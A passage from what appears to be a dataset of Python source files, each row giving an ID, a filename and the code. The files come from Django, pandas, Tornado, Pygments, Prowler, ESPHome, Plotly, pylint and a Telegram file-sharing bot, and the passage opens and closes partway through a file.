    @property
    def CORS_ALLOWED_ORIGINS(self) -> list[str] | tuple[str]:
        value = getattr(
            settings,
            ""CORS_ALLOWED_ORIGINS"",
            getattr(settings, ""CORS_ORIGIN_WHITELIST"", ()),
        )
        return cast(Union[List[str], Tuple[str]], value)

    @property
    def CORS_ALLOWED_ORIGIN_REGEXES(self) -> Sequence[str | Pattern[str]]:
        return getattr(
            settings,
            ""CORS_ALLOWED_ORIGIN_REGEXES"",
            getattr(settings, ""CORS_ORIGIN_REGEX_WHITELIST"", ()),
        )

    @property
    def CORS_EXPOSE_HEADERS(self) -> Sequence[str]:
        return getattr(settings, ""CORS_EXPOSE_HEADERS"", ())

    @property
    def CORS_URLS_REGEX(self) -> str | Pattern[str]:
        return getattr(settings, ""CORS_URLS_REGEX"", r""^.*$"")

    @property
    def CORS_REPLACE_HTTPS_REFERER(self) -> bool:
        return getattr(settings, ""CORS_REPLACE_HTTPS_REFERER"", False)


conf = Settings()"
JD106	JD106-models.py	"""""""
 The GeometryColumns and SpatialRefSys models for the SpatiaLite backend.
""""""
from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin
from django.db import models


class SpatialiteGeometryColumns(models.Model):
    """"""
    The 'geometry_columns' table from SpatiaLite.
    """"""
    f_table_name = models.CharField(max_length=256)
    f_geometry_column = models.CharField(max_length=256)
    coord_dimension = models.IntegerField()
    srid = models.IntegerField(primary_key=True)
    spatial_index_enabled = models.IntegerField()
    type = models.IntegerField(db_column='geometry_type')

    class Meta:
        app_label = 'gis'
        db_table = 'geometry_columns'
        managed = False

    def __str__(self):
        return '%s.%s - %dD %s field (SRID: %d)' % (
            self.f_table_name,
            self.f_geometry_column,
            self.coord_dimension,
            self.type,
            self.srid,
        )

    @classmethod
    def table_name_col(cls):
        """"""
        Return the name of the metadata column used to store the feature table
        name.
        """"""
        return 'f_table_name'

    @classmethod
    def geom_col_name(cls):
        """"""
        Return the name of the metadata column used to store the feature
        geometry column.
        """"""
        return 'f_geometry_column'


class SpatialiteSpatialRefSys(models.Model, SpatialRefSysMixin):
    """"""
    The 'spatial_ref_sys' table from SpatiaLite.
    """"""
    srid = models.IntegerField(primary_key=True)
    auth_name = models.CharField(max_length=256)
    auth_srid = models.IntegerField()
    ref_sys_name = models.CharField(max_length=256)
    proj4text = models.CharField(max_length=2048)
    srtext = models.CharField(max_length=2048)

    class Meta:
        app_label = 'gis'
        db_table = 'spatial_ref_sys'
        managed = False

    @property
    def wkt(self):
        return self.srtext"
JD268	JD268-translation.py	"from django.conf import settings
from django.utils.translation import get_supported_language_variant
from django.utils.translation.trans_real import language_code_re

from . import Error, Tags, register

E001 = Error(
    ""You have provided an invalid value for the LANGUAGE_CODE setting: {!r}."",
    id=""translation.E001"",
)

E002 = Error(
    ""You have provided an invalid language code in the LANGUAGES setting: {!r}."",
    id=""translation.E002"",
)

E003 = Error(
    ""You have provided an invalid language code in the LANGUAGES_BIDI setting: {!r}."",
    id=""translation.E003"",
)

E004 = Error(
    ""You have provided a value for the LANGUAGE_CODE setting that is not in ""
    ""the LANGUAGES setting."",
    id=""translation.E004"",
)


@register(Tags.translation)
def check_setting_language_code(app_configs, **kwargs):
    """"""Error if LANGUAGE_CODE setting is invalid.""""""
    tag = settings.LANGUAGE_CODE
    if not isinstance(tag, str) or not language_code_re.match(tag):
        return [Error(E001.msg.format(tag), id=E001.id)]
    return []


@register(Tags.translation)
def check_setting_languages(app_configs, **kwargs):
    """"""Error if LANGUAGES setting is invalid.""""""
    return [
        Error(E002.msg.format(tag), id=E002.id)
        for tag, _ in settings.LANGUAGES
        if not isinstance(tag, str) or not language_code_re.match(tag)
    ]


@register(Tags.translation)
def check_setting_languages_bidi(app_configs, **kwargs):
    """"""Error if LANGUAGES_BIDI setting is invalid.""""""
    return [
        Error(E003.msg.format(tag), id=E003.id)
        for tag in settings.LANGUAGES_BIDI
        if not isinstance(tag, str) or not language_code_re.match(tag)
    ]


@register(Tags.translation)
def check_language_settings_consistent(app_configs, **kwargs):
    """"""Error if language settings are not consistent with each other.""""""
    try:
        get_supported_language_variant(settings.LANGUAGE_CODE)
    except LookupError:
        return [E004]
    else:
        return []"
JD203	JD203-capnproto.py	"""""""
    pygments.lexers.capnproto
    ~~~~~~~~~~~~~~~~~~~~~~~~~

    Lexers for the Cap'n Proto schema language.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer, default
from pygments.token import Text, Comment, Keyword, Name, Literal, Whitespace

__all__ = ['CapnProtoLexer']


class CapnProtoLexer(RegexLexer):
    """"""
    For Cap'n Proto source.

    .. versionadded:: 2.2
    """"""
    name = 'Cap\'n Proto'
    url = 'https://capnproto.org'
    filenames = ['*.capnp']
    aliases = ['capnp']

    tokens = {
        'root': [
            (r'#.*?$', Comment.Single),
            (r'@[0-9a-zA-Z]*', Name.Decorator),
            (r'=', Literal, 'expression'),
            (r':', Name.Class, 'type'),
            (r'\$', Name.Attribute, 'annotation'),
            (r'(struct|enum|interface|union|import|using|const|annotation|'
             r'extends|in|of|on|as|with|from|fixed)\b',
             Keyword),
            (r'[\w.]+', Name),
            (r'[^#@=:$\w\s]+', Text),
            (r'\s+', Whitespace),
        ],
        'type': [
            (r'[^][=;,(){}$]+', Name.Class),
            (r'[\[(]', Name.Class, 'parentype'),
            default('#pop'),
        ],
        'parentype': [
            (r'[^][;()]+', Name.Class),
            (r'[\[(]', Name.Class, '#push'),
            (r'[])]', Name.Class, '#pop'),
            default('#pop'),
        ],
        'expression': [
            (r'[^][;,(){}$]+', Literal),
            (r'[\[(]', Literal, 'parenexp'),
            default('#pop'),
        ],
        'parenexp': [
            (r'[^][;()]+', Literal),
            (r'[\[(]', Literal, '#push'),
            (r'[])]', Literal, '#pop'),
            default('#pop'),
        ],
        'annotation': [
            (r'[^][;,(){}=:]+', Name.Attribute),
            (r'[\[(]', Name.Attribute, 'annexp'),
            default('#pop'),
        ],
        'annexp': [
            (r'[^][;()]+', Name.Attribute),
            (r'[\[(]', Name.Attribute, '#push'),
            (r'[])]', Name.Attribute, '#pop'),
            default('#pop'),
        ],
    }"
JY138	JY138-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = 'l, j F, Y'
TIME_FORMAT = 'h:i a'
DATETIME_FORMAT = 'j F, Y h:i a'
YEAR_MONTH_FORMAT = 'F, Y'
MONTH_DAY_FORMAT = 'j F'
SHORT_DATE_FORMAT = 'j.M.Y'
SHORT_DATETIME_FORMAT = 'j.M.Y H:i'
FIRST_DAY_OF_WEEK = 1  # (Monday)

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
# Kept ISO formats as they are in first position
DATE_INPUT_FORMATS = [
    '%Y-%m-%d', '%m/%d/%Y', '%m/%d/%y',     # '2006-10-25', '10/25/2006', '10/25/06'
    '%d.%m.%Y', '%d.%m.%y',                 # '25.10.2006', '25.10.06'
    # '%d %b %Y', '%d %b, %Y', '%d %b. %Y',   # '25 Oct 2006', '25 Oct, 2006', '25 Oct. 2006'
    # '%d %B %Y', '%d %B, %Y',                # '25 October 2006', '25 October, 2006'
]
DATETIME_INPUT_FORMATS = [
    '%Y-%m-%d %H:%M:%S',     # '2006-10-25 14:30:59'
    '%Y-%m-%d %H:%M:%S.%f',  # '2006-10-25 14:30:59.000200'
    '%Y-%m-%d %H:%M',        # '2006-10-25 14:30'
    '%d.%m.%Y %H:%M:%S',     # '25.10.2006 14:30:59'
    '%d.%m.%Y %H:%M:%S.%f',  # '25.10.2006 14:30:59.000200'
    '%d.%m.%Y %H:%M',        # '25.10.2006 14:30'
    '%d.%m.%y %H:%M:%S',     # '25.10.06 14:30:59'
    '%d.%m.%y %H:%M:%S.%f',  # '25.10.06 14:30:59.000200'
    '%d.%m.%y %H:%M',        # '25.10.06 14:30'
    '%m/%d/%Y %H:%M:%S',     # '10/25/2006 14:30:59'
    '%m/%d/%Y %H:%M:%S.%f',  # '10/25/2006 14:30:59.000200'
    '%m/%d/%Y %H:%M',        # '10/25/2006 14:30'
    '%m/%d/%y %H:%M:%S',     # '10/25/06 14:30:59'
    '%m/%d/%y %H:%M:%S.%f',  # '10/25/06 14:30:59.000200'
    '%m/%d/%y %H:%M',        # '10/25/06 14:30'
]
DECIMAL_SEPARATOR = '.'
THOUSAND_SEPARATOR = "" ""
NUMBER_GROUPING = 3"
JY451	JY451-test_delitem.py	"import re

import numpy as np
import pytest

from pandas import (
    DataFrame,
    MultiIndex,
)


class TestDataFrameDelItem:
    def test_delitem(self, float_frame):
        del float_frame[""A""]
        assert ""A"" not in float_frame

    def test_delitem_multiindex(self):
        midx = MultiIndex.from_product([[""A"", ""B""], [1, 2]])
        df = DataFrame(np.random.randn(4, 4), columns=midx)
        assert len(df.columns) == 4
        assert (""A"",) in df.columns
        assert ""A"" in df.columns

        result = df[""A""]
        assert isinstance(result, DataFrame)
        del df[""A""]

        assert len(df.columns) == 2

        # A still in the levels, BUT get a KeyError if trying
        # to delete
        assert (""A"",) not in df.columns
        with pytest.raises(KeyError, match=re.escape(""('A',)"")):
            del df[(""A"",)]

        # behavior of dropped/deleted MultiIndex levels changed from
        # GH 2770 to GH 19027: MultiIndex no longer '.__contains__'
        # levels which are dropped/deleted
        assert ""A"" not in df.columns
        with pytest.raises(KeyError, match=re.escape(""('A',)"")):
            del df[""A""]

    def test_delitem_corner(self, float_frame):
        f = float_frame.copy()
        del f[""D""]
        assert len(f.columns) == 3
        with pytest.raises(KeyError, match=r""^'D'$""):
            del f[""D""]
        del f[""B""]
        assert len(f.columns) == 2

    def test_delitem_col_still_multiindex(self):
        arrays = [[""a"", ""b"", ""c"", ""top""], ["""", """", """", ""OD""], ["""", """", """", ""wx""]]

        tuples = sorted(zip(*arrays))
        index = MultiIndex.from_tuples(tuples)

        df = DataFrame(np.random.randn(3, 4), columns=index)
        del df[(""a"", """", """")]
        assert isinstance(df.columns, MultiIndex)"
JY562	JY562-introspection.py	"from MySQLdb.constants import FIELD_TYPE

from django.contrib.gis.gdal import OGRGeomType
from django.db.backends.mysql.introspection import DatabaseIntrospection


class MySQLIntrospection(DatabaseIntrospection):
    # Updating the data_types_reverse dictionary with the appropriate
    # type for Geometry fields.
    data_types_reverse = DatabaseIntrospection.data_types_reverse.copy()
    data_types_reverse[FIELD_TYPE.GEOMETRY] = 'GeometryField'

    def get_geometry_type(self, table_name, description):
        with self.connection.cursor() as cursor:
            # In order to get the specific geometry type of the field,
            # we introspect on the table definition using `DESCRIBE`.
            cursor.execute('DESCRIBE %s' %
                           self.connection.ops.quote_name(table_name))
            # Increment over description info until we get to the geometry
            # column.
            for column, typ, null, key, default, extra in cursor.fetchall():
                if column == description.name:
                    # Using OGRGeomType to convert from OGC name to Django field.
                    # MySQL does not support 3D or SRIDs, so the field params
                    # are empty.
                    field_type = OGRGeomType(typ).django
                    field_params = {}
                    break
        return field_type, field_params

    def supports_spatial_index(self, cursor, table_name):
        # Supported with MyISAM/Aria, or InnoDB on MySQL 5.7.5+/MariaDB 10.2.2+
        storage_engine = self.get_storage_engine(cursor, table_name)
        if storage_engine == 'InnoDB':
            return self.connection.mysql_version >= (
                (10, 2, 2) if self.connection.mysql_is_mariadb else (5, 7, 5)
            )
        return storage_engine in ('MyISAM', 'Aria')"
JD348	JD348-sns_topics_not_publicly_accessible.py	"from prowler.lib.check.models import Check, Check_Report_AWS
from prowler.providers.aws.services.sns.sns_client import sns_client


class sns_topics_not_publicly_accessible(Check):
    def execute(self):
        findings = []
        for topic in sns_client.topics:
            report = Check_Report_AWS(self.metadata())
            report.region = topic.region
            report.resource_id = topic.name
            report.resource_arn = topic.arn
            report.status = ""PASS""
            report.status_extended = f""SNS topic {topic.name} without public access""
            if topic.policy:
                for statement in topic.policy[""Statement""]:
                    # Only check allow statements
                    if statement[""Effect""] == ""Allow"":
                        if (
                            ""*"" in statement[""Principal""]
                            or (
                                ""AWS"" in statement[""Principal""]
                                and ""*"" in statement[""Principal""][""AWS""]
                            )
                            or (
                                ""CanonicalUser"" in statement[""Principal""]
                                and ""*"" in statement[""Principal""][""CanonicalUser""]
                            )
                        ):
                            if ""Condition"" not in statement:
                                report.status = ""FAIL""
                                report.status_extended = (
                                    f""SNS topic {topic.name} policy with public access""
                                )
                            else:
                                report.status = ""FAIL""
                                report.status_extended = f""SNS topic {topic.name} policy with public access but has a Condition""

            findings.append(report)

        return findings"
JY44	JY44-__init__.py	"""""""
Filters decide whether something is active or not (they decide about a boolean
state). This is used to enable/disable features, like key bindings, parts of
the layout and other stuff. For instance, we could have a `HasSearch` filter
attached to some part of the layout, in order to show that part of the user
interface only while the user is searching.

Filters are made to avoid having to attach callbacks to all event in order to
propagate state. However, they are lazy, they don't automatically propagate the
state of what they are observing. Only when a filter is called (it's actually a
callable), it will calculate its value. So, its not really reactive
programming, but it's made to fit for this framework.

Filters can be chained using ``&`` and ``|`` operations, and inverted using the
``~`` operator, for instance::

    filter = has_focus('default') & ~ has_selection
""""""
from .app import *
from .base import Always, Condition, Filter, FilterOrBool, Never
from .cli import *
from .utils import is_true, to_filter

__all__ = [
    # app
    ""has_arg"",
    ""has_completions"",
    ""completion_is_selected"",
    ""has_focus"",
    ""buffer_has_focus"",
    ""has_selection"",
    ""has_validation_error"",
    ""is_done"",
    ""is_read_only"",
    ""is_multiline"",
    ""renderer_height_is_known"",
    ""in_editing_mode"",
    ""in_paste_mode"",
    ""vi_mode"",
    ""vi_navigation_mode"",
    ""vi_insert_mode"",
    ""vi_insert_multiple_mode"",
    ""vi_replace_mode"",
    ""vi_selection_mode"",
    ""vi_waiting_for_text_object_mode"",
    ""vi_digraph_mode"",
    ""vi_recording_macro"",
    ""emacs_mode"",
    ""emacs_insert_mode"",
    ""emacs_selection_mode"",
    ""shift_selection_mode"",
    ""is_searching"",
    ""control_is_searchable"",
    ""vi_search_direction_reversed"",
    # base.
    ""Filter"",
    ""Never"",
    ""Always"",
    ""Condition"",
    ""FilterOrBool"",
    # utils.
    ""is_true"",
    ""to_filter"",
]

from .cli import __all__ as cli_all

__all__.extend(cli_all)"
JD503	JD503-test_offsets_properties.py	"""""""
Behavioral based tests for offsets and date_range.

This file is adapted from https://github.com/pandas-dev/pandas/pull/18761 -
which was more ambitious but less idiomatic in its use of Hypothesis.

You may wish to consult the previous version for inspiration on further
tests, or when trying to pin down the bugs exposed by the tests below.
""""""
from hypothesis import (
    assume,
    given,
)
import pytest
import pytz

import pandas as pd
from pandas._testing._hypothesis import (
    DATETIME_JAN_1_1900_OPTIONAL_TZ,
    YQM_OFFSET,
)

# ----------------------------------------------------------------
# Offset-specific behaviour tests


@pytest.mark.arm_slow
@given(DATETIME_JAN_1_1900_OPTIONAL_TZ, YQM_OFFSET)
def test_on_offset_implementations(dt, offset):
    assume(not offset.normalize)
    # check that the class-specific implementations of is_on_offset match
    # the general case definition:
    #   (dt + offset) - offset == dt
    try:
        compare = (dt + offset) - offset
    except (pytz.NonExistentTimeError, pytz.AmbiguousTimeError):
        # When dt + offset does not exist or is DST-ambiguous, assume(False) to
        # indicate to hypothesis that this is not a valid test case
        # DST-ambiguous example (GH41906):
        # dt = datetime.datetime(1900, 1, 1, tzinfo=pytz.timezone('Africa/Kinshasa'))
        # offset = MonthBegin(66)
        assume(False)

    assert offset.is_on_offset(dt) == (compare == dt)


@given(YQM_OFFSET)
def test_shift_across_dst(offset):
    # GH#18319 check that 1) timezone is correctly normalized and
    # 2) that hour is not incorrectly changed by this normalization
    assume(not offset.normalize)

    # Note that dti includes a transition across DST boundary
    dti = pd.date_range(
        start=""2017-10-30 12:00:00"", end=""2017-11-06"", freq=""D"", tz=""US/Eastern""
    )
    assert (dti.hour == 12).all()  # we haven't screwed up yet

    res = dti + offset
    assert (res.hour == 12).all()"
JY502	JY502-__init__.py	"import esphome.codegen as cg
import esphome.config_validation as cv
from esphome import pins
from esphome.components import display
from esphome.const import (
    CONF_BRIGHTNESS,
    CONF_EXTERNAL_VCC,
    CONF_LAMBDA,
    CONF_MODEL,
    CONF_RESET_PIN,
)

CODEOWNERS = [""@kbx81""]

ssd1325_base_ns = cg.esphome_ns.namespace(""ssd1325_base"")
SSD1325 = ssd1325_base_ns.class_(""SSD1325"", cg.PollingComponent, display.DisplayBuffer)
SSD1325Model = ssd1325_base_ns.enum(""SSD1325Model"")

MODELS = {
    ""SSD1325_128X32"": SSD1325Model.SSD1325_MODEL_128_32,
    ""SSD1325_128X64"": SSD1325Model.SSD1325_MODEL_128_64,
    ""SSD1325_96X16"": SSD1325Model.SSD1325_MODEL_96_16,
    ""SSD1325_64X48"": SSD1325Model.SSD1325_MODEL_64_48,
    ""SSD1327_128X128"": SSD1325Model.SSD1327_MODEL_128_128,
}

SSD1325_MODEL = cv.enum(MODELS, upper=True, space=""_"")

SSD1325_SCHEMA = display.FULL_DISPLAY_SCHEMA.extend(
    {
        cv.Required(CONF_MODEL): SSD1325_MODEL,
        cv.Optional(CONF_RESET_PIN): pins.gpio_output_pin_schema,
        cv.Optional(CONF_BRIGHTNESS, default=1.0): cv.percentage,
        cv.Optional(CONF_EXTERNAL_VCC): cv.boolean,
    }
).extend(cv.polling_component_schema(""1s""))


async def setup_ssd1325(var, config):
    await cg.register_component(var, config)
    await display.register_display(var, config)

    cg.add(var.set_model(config[CONF_MODEL]))
    if CONF_RESET_PIN in config:
        reset = await cg.gpio_pin_expression(config[CONF_RESET_PIN])
        cg.add(var.set_reset_pin(reset))
    if CONF_BRIGHTNESS in config:
        cg.add(var.init_brightness(config[CONF_BRIGHTNESS]))
    if CONF_EXTERNAL_VCC in config:
        cg.add(var.set_external_vcc(config[CONF_EXTERNAL_VCC]))
    if CONF_LAMBDA in config:
        lambda_ = await cg.process_lambda(
            config[CONF_LAMBDA], [(display.DisplayBufferRef, ""it"")], return_type=cg.void
        )
        cg.add(var.set_writer(lambda_))"
JY358	JY358-_textfont.py	"import _plotly_utils.basevalidators


class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""textfont"", parent_name=""icicle"", **kwargs):
        super(TextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY384	JY384-__init__.py	"# Copyright (c) 2006, 2010, 2012-2014 LOGILAB S.A. (Paris, FRANCE) <contact@logilab.fr>
# Copyright (c) 2012-2014 Google, Inc.
# Copyright (c) 2012 FELD Boris <lothiraldan@gmail.com>
# Copyright (c) 2014-2020 Claudiu Popa <pcmanticore@gmail.com>
# Copyright (c) 2014 Brett Cannon <brett@python.org>
# Copyright (c) 2014 Ricardo Gemignani <ricardo.gemignani@gmail.com>
# Copyright (c) 2014 Arun Persaud <arun@nubati.net>
# Copyright (c) 2015 Simu Toni <simutoni@gmail.com>
# Copyright (c) 2015 Ionel Cristian Maries <contact@ionelmc.ro>
# Copyright (c) 2017 Kári Tristan Helgason <kthelgason@gmail.com>
# Copyright (c) 2018 ssolanki <sushobhitsolanki@gmail.com>
# Copyright (c) 2018 Sushobhit <31987769+sushobhit27@users.noreply.github.com>
# Copyright (c) 2018 Ville Skyttä <ville.skytta@iki.fi>
# Copyright (c) 2019, 2021 Pierre Sassoulas <pierre.sassoulas@gmail.com>
# Copyright (c) 2020 hippo91 <guillaume.peillex@gmail.com>
# Copyright (c) 2020 Anthony Sottile <asottile@umich.edu>
# Copyright (c) 2021 Marc Mueller <30130371+cdce8p@users.noreply.github.com>
# Copyright (c) 2021 ruro <ruro.ruro@ya.ru>

# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE

""""""utilities methods and classes for reporters""""""


from pylint import utils
from pylint.reporters.base_reporter import BaseReporter
from pylint.reporters.collecting_reporter import CollectingReporter
from pylint.reporters.json_reporter import JSONReporter
from pylint.reporters.multi_reporter import MultiReporter
from pylint.reporters.reports_handler_mix_in import ReportsHandlerMixIn


def initialize(linter):
    """"""initialize linter with reporters in this package""""""
    utils.register_plugins(linter, __path__[0])


__all__ = [
    ""BaseReporter"",
    ""ReportsHandlerMixIn"",
    ""JSONReporter"",
    ""CollectingReporter"",
    ""MultiReporter"",
]"
JY16	JY16-http1connection_test.py	"import socket
import typing

from tornado.http1connection import HTTP1Connection
from tornado.httputil import HTTPMessageDelegate
from tornado.iostream import IOStream
from tornado.locks import Event
from tornado.netutil import add_accept_handler
from tornado.testing import AsyncTestCase, bind_unused_port, gen_test


class HTTP1ConnectionTest(AsyncTestCase):
    code = None  # type: typing.Optional[int]

    def setUp(self):
        super().setUp()
        self.asyncSetUp()

    @gen_test
    def asyncSetUp(self):
        listener, port = bind_unused_port()
        event = Event()

        def accept_callback(conn, addr):
            self.server_stream = IOStream(conn)
            self.addCleanup(self.server_stream.close)
            event.set()

        add_accept_handler(listener, accept_callback)
        self.client_stream = IOStream(socket.socket())
        self.addCleanup(self.client_stream.close)
        yield [self.client_stream.connect((""127.0.0.1"", port)), event.wait()]
        self.io_loop.remove_handler(listener)
        listener.close()

    @gen_test
    def test_http10_no_content_length(self):
        # Regression test for a bug in which can_keep_alive would crash
        # for an HTTP/1.0 (not 1.1) response with no content-length.
        conn = HTTP1Connection(self.client_stream, True)
        self.server_stream.write(b""HTTP/1.0 200 Not Modified\r\n\r\nhello"")
        self.server_stream.close()

        event = Event()
        test = self
        body = []

        class Delegate(HTTPMessageDelegate):
            def headers_received(self, start_line, headers):
                test.code = start_line.code

            def data_received(self, data):
                body.append(data)

            def finish(self):
                event.set()

        yield conn.read_response(Delegate())
        yield event.wait()
        self.assertEqual(self.code, 200)
        self.assertEqual(b"""".join(body), b""hello"")"
JY46	JY46-py.py	"from __future__ import absolute_import, division, unicode_literals
from pip._vendor.six import text_type

from bisect import bisect_left

from ._base import Trie as ABCTrie


class Trie(ABCTrie):
    def __init__(self, data):
        if not all(isinstance(x, text_type) for x in data.keys()):
            raise TypeError(""All keys must be strings"")

        self._data = data
        self._keys = sorted(data.keys())
        self._cachestr = """"
        self._cachepoints = (0, len(data))

    def __contains__(self, key):
        return key in self._data

    def __len__(self):
        return len(self._data)

    def __iter__(self):
        return iter(self._data)

    def __getitem__(self, key):
        return self._data[key]

    def keys(self, prefix=None):
        if prefix is None or prefix == """" or not self._keys:
            return set(self._keys)

        if prefix.startswith(self._cachestr):
            lo, hi = self._cachepoints
            start = i = bisect_left(self._keys, prefix, lo, hi)
        else:
            start = i = bisect_left(self._keys, prefix)

        keys = set()
        if start == len(self._keys):
            return keys

        while self._keys[i].startswith(prefix):
            keys.add(self._keys[i])
            i += 1

        self._cachestr = prefix
        self._cachepoints = (start, i)

        return keys

    def has_keys_with_prefix(self, prefix):
        if prefix in self._data:
            return True

        if prefix.startswith(self._cachestr):
            lo, hi = self._cachepoints
            i = bisect_left(self._keys, prefix, lo, hi)
        else:
            i = bisect_left(self._keys, prefix)

        if i == len(self._keys):
            return False

        return self._keys[i].startswith(prefix)"
JY18	JY18-import_test.py	"# flake8: noqa
import subprocess
import sys
import unittest

_import_everything = b""""""
# The event loop is not fork-safe, and it's easy to initialize an asyncio.Future
# at startup, which in turn creates the default event loop and prevents forking.
# Explicitly disallow the default event loop so that an error will be raised
# if something tries to touch it.
import asyncio
asyncio.set_event_loop(None)

import tornado.auth
import tornado.autoreload
import tornado.concurrent
import tornado.escape
import tornado.gen
import tornado.http1connection
import tornado.httpclient
import tornado.httpserver
import tornado.httputil
import tornado.ioloop
import tornado.iostream
import tornado.locale
import tornado.log
import tornado.netutil
import tornado.options
import tornado.process
import tornado.simple_httpclient
import tornado.tcpserver
import tornado.tcpclient
import tornado.template
import tornado.testing
import tornado.util
import tornado.web
import tornado.websocket
import tornado.wsgi

try:
    import pycurl
except ImportError:
    pass
else:
    import tornado.curl_httpclient
""""""


class ImportTest(unittest.TestCase):
    def test_import_everything(self):
        # Test that all Tornado modules can be imported without side effects,
        # specifically without initializing the default asyncio event loop.
        # Since we can't tell which modules may have already beein imported
        # in our process, do it in a subprocess for a clean slate.
        proc = subprocess.Popen([sys.executable], stdin=subprocess.PIPE)
        proc.communicate(_import_everything)
        self.assertEqual(proc.returncode, 0)

    def test_import_aliases(self):
        # Ensure we don't delete formerly-documented aliases accidentally.
        import tornado.ioloop
        import tornado.gen
        import tornado.util
        import asyncio

        self.assertIs(tornado.ioloop.TimeoutError, tornado.util.TimeoutError)
        self.assertIs(tornado.gen.TimeoutError, tornado.util.TimeoutError)
        self.assertIs(tornado.util.TimeoutError, asyncio.TimeoutError)"
JY5	JY5-big5prober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is Mozilla Communicator client code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .chardistribution import Big5DistributionAnalysis
from .codingstatemachine import CodingStateMachine
from .mbcharsetprober import MultiByteCharSetProber
from .mbcssm import BIG5_SM_MODEL


class Big5Prober(MultiByteCharSetProber):
    def __init__(self) -> None:
        super().__init__()
        self.coding_sm = CodingStateMachine(BIG5_SM_MODEL)
        self.distribution_analyzer = Big5DistributionAnalysis()
        self.reset()

    @property
    def charset_name(self) -> str:
        return ""Big5""

    @property
    def language(self) -> str:
        return ""Chinese"""
JY280	JY280-Data.py	"# Credits: @mrismanaziz
# FROM File-Sharing-Man <https://github.com/mrismanaziz/File-Sharing-Man/>
# t.me/SharingUserbot & t.me/Lunatic0de

from pyrogram.types import InlineKeyboardButton

class Data:
    HELP = """"""
<b> ❏ Perintah untuk Pengguna BOT
 ├ /start - Mulai Bot
 ├ /about - Tentang Bot ini
 ├ /help - Bantuan Perintah Bot ini
 ├ /ping - Untuk mengecek bot hidup
 └ /uptime - Untuk melihat status bot 
 
 ❏ Perintah Untuk Admin BOT
 ├ /logs - Untuk melihat logs bot
 ├ /setvar - Untuk mengatur var dengan command dibot
 ├ /delvar - Untuk menghapus var dengan command dibot
 ├ /getvar - Untuk melihat salah satu var dengan command dibot
 ├ /users - Untuk melihat statistik pengguna bot
 ├ /batch - Untuk membuat link lebih dari satu file
 ├ /speedtest - Untuk Mengetes kecepatan server bot
 └ /broadcast - Untuk mengirim pesan broadcast ke pengguna bot

👨‍💻 Develoved by </b><a href='https://t.me/Lunatic0de/101'>@Lunatic0de</a>
""""""

    close = [
        [InlineKeyboardButton(""ᴛᴜᴛᴜᴘ"", callback_data=""close"")]
    ]

    mbuttons = [
        [
            InlineKeyboardButton(""ʜᴇʟᴘ & ᴄᴏᴍᴍᴀɴᴅs"", callback_data=""help""),
            InlineKeyboardButton(""ᴛᴜᴛᴜᴘ"", callback_data=""close"")
        ],
    ]

    buttons = [
        [
            InlineKeyboardButton(""ᴛᴇɴᴛᴀɴɢ sᴀʏᴀ"", callback_data=""about""),
            InlineKeyboardButton(""ᴛᴜᴛᴜᴘ"", callback_data=""close"")
        ],
    ]

    ABOUT = """"""
<b>Tentang Bot ini:

@{} adalah Bot Telegram untuk menyimpan Postingan atau File yang dapat Diakses melalui Link Khusus.

 • Creator: @{}
 • Framework: <a href='https://docs.pyrogram.org'>Pyrogram</a>
 • Source Code: <a href='https://github.com/mrismanaziz/File-Sharing-Man'>File-Sharing-Man v4</a>

👨‍💻 Develoved by </b><a href='https://t.me/Lunatic0de/101'>@Lunatic0de</a>
"""""""
JD522	JD522-client.py	"import signal

from django.db.backends.base.client import BaseDatabaseClient


class DatabaseClient(BaseDatabaseClient):
    executable_name = ""psql""

    @classmethod
    def settings_to_cmd_args_env(cls, settings_dict, parameters):
        args = [cls.executable_name]
        options = settings_dict.get(""OPTIONS"", {})

        host = settings_dict.get(""HOST"")
        port = settings_dict.get(""PORT"")
        dbname = settings_dict.get(""NAME"")
        user = settings_dict.get(""USER"")
        passwd = settings_dict.get(""PASSWORD"")
        passfile = options.get(""passfile"")
        service = options.get(""service"")
        sslmode = options.get(""sslmode"")
        sslrootcert = options.get(""sslrootcert"")
        sslcert = options.get(""sslcert"")
